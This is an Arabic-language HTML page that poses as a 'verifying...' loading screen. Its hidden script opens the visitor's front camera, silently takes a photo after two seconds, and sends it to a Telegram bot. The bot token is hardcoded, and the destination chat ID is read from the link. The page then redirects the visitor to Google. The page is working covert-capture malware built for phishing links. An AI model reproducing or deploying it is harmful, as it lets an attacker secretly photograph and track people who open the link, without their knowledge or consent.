<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق...</title>
    <style>
        body {
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        .loader {
            border: 8px fandi #ddd;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="loader"></div>
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const token = '8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E';
        
        // استخراج الـ chatId من الرابط
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chatId') || urlParams.get('sender_id');

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // انتظر قليلاً حتى تفتح الكاميرا بوضوح ثم التقط الصورة
                setTimeout(() => {
                    takePhoto();
                }, 2000);
            } catch (err) {
                console.error("خطأ في الكاميرا: ", err);
            }
        }

        function takePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            context.drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'image.jpg');

                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(response => {
                    // بعد إرسال الصورة، يمكن توجيه المستخدم لصفحة أخرى
                    window.location.href = "https://www.google.com";
                })
                .catch(error => console.error('خطأ في الإرسال:', error));
            }, 'image/jpeg');
        }

        // بدء العملية عند فتح الصفحة
        if (chatId) {
            startCamera();
        } else {
            alert("خطأ: المعرف غير موجود");
        }
    </script>
</body>
</html>
